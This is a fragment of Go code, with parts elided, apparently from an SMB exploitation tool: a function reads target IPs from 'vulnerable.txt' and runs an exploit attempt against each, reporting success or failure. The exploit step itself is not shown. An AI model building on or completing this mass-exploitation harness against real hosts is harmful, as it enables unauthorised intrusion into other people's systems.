...
func SMBEXP() {
	...
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Println("No vulnerable.txt file or empty file. Exiting.")
			return
		}
		log.Fatal(err)
	}

	// Split IP addresses by newline
	addresses := strings.Split(string(ipData), "\n")
	...
	for _, address := range addresses {
		...
		if err != nil {
			log.Println("Failed to exploit", address, ":", err)
		} else {
			fmt.Println("Exploit successful for", address)
		}
	}

	fmt.Println("Exploitation attempts completed.")
}
